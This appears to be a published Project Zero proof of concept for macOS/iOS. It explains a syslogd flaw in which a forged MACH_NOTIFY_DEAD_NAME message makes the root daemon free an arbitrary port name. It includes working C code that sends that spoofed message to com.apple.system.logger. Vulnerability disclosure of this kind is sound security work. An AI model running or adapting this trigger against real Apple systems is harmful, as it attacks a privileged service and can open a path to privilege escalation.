@@ -1,0 +1,123 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=977
+
+syslogd (running as root) hosts the com.apple.system.logger mach service. It's part of the system.sb
+sandbox profile and so reachable from a lot of sandboxed contexts.
+
+Here's a snippet from its mach message handling loop listening on the service port:
+
+    ks = mach_msg(&(request->head), rbits, 0, rqs, global.listen_set, 0, MACH_PORT_NULL);
+  ...
+    if (request->head.msgh_id == MACH_NOTIFY_DEAD_NAME)
+    {
+      deadname = (mach_dead_name_notification_t *)request;
+      dispatch_async(asl_server_queue, ^{
+        cancel_session(deadname->not_port);
+        /* dead name notification includes a dead name right */
+        mach_port_deallocate(mach_task_self(), deadname->not_port);
+        free(request);
+      });
+
+An attacker with a send-right to the service can spoof a MACH_NOTIFY_DEAD_NAME message and cause an
+arbitrary port name to be passed to mach_port_deallocate as deadname->not_port doesn't name a port right
+but is a mach_port_name_t which is just a controlled integer.
+
+An attacker could cause syslogd to free a privilged port name and get it reused to name a port for which
+the attacker holds a receive right.
+
+Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555)
+*/
+
+// ianbeer
+
+#if 0
+MacOS/iOS arbitrary port replacement in syslogd
+
+syslogd (running as root) hosts the com.apple.system.logger mach service. It's part of the system.sb
+sandbox profile and so reachable from a lot of sandboxed contexts.
+
+Here's a snippet from its mach message handling loop listening on the service port:
+
+		ks = mach_msg(&(request->head), rbits, 0, rqs, global.listen_set, 0, MACH_PORT_NULL);
+	...
+		if (request->head.msgh_id == MACH_NOTIFY_DEAD_NAME)
+		{
+			deadname = (mach_dead_name_notification_t *)request;
+			dispatch_async(asl_server_queue, ^{
+				cancel_session(deadname->not_port);
+				/* dead name notification includes a dead name right */
+				mach_port_deallocate(mach_task_self(), deadname->not_port);
+				free(request);
+			});
+
+An attacker with a send-right to the service can spoof a MACH_NOTIFY_DEAD_NAME message and cause an
+arbitrary port name to be passed to mach_port_deallocate as deadname->not_port doesn't name a port right
+but is a mach_port_name_t which is just a controlled integer.
+
+An attacker could cause syslogd to free a privilged port name and get it reused to name a port for which
+the attacker holds a receive right.
+
+Tested on MacBookAir5,2 MacOS Sierra 10.12.1 (16B2555)
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#include <servers/bootstrap.h>
+#include <mach/mach.h>
+#include <mach/ndr.h>
+
+char* service_name = "com.apple.system.logger";
+
+struct notification_msg {
+    mach_msg_header_t   not_header;
+    NDR_record_t        NDR;
+    mach_port_name_t not_port;
+};
+
+mach_port_t lookup(char* name) {
+  mach_port_t service_port = MACH_PORT_NULL;
+  kern_return_t err = bootstrap_look_up(bootstrap_port, name, &service_port);
+  if(err != KERN_SUCCESS){
+    printf("unable to look up %s\n", name);
+    return MACH_PORT_NULL;
+  }
+  
+  return service_port;
+}
+
+int main() {
+  kern_return_t err;
+
+  mach_port_t service_port = lookup(service_name);
+
+  mach_port_name_t target_port = 0x1234; // the name of the port in the target namespace to destroy
+
+  printf("%d\n", getpid());
+  printf("service port: %x\n", service_port);
+
+	struct notification_msg not = {0};
+
+  not.not_header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+  not.not_header.msgh_size = sizeof(struct notification_msg);
+  not.not_header.msgh_remote_port = service_port;
+  not.not_header.msgh_local_port = MACH_PORT_NULL;
+  not.not_header.msgh_id = 0110; // MACH_NOTIFY_DEAD_NAME
+
+	not.NDR = NDR_record;
+
+	not.not_port = target_port;
+
+  // send the fake notification message
+  err = mach_msg(&not.not_header,
+                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
+                 (mach_msg_size_t)sizeof(struct notification_msg),
+                 0,
+                 MACH_PORT_NULL,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL); 
+  printf("fake notification message: %s\n", mach_error_string(err));
+  
+  return 0;
+}
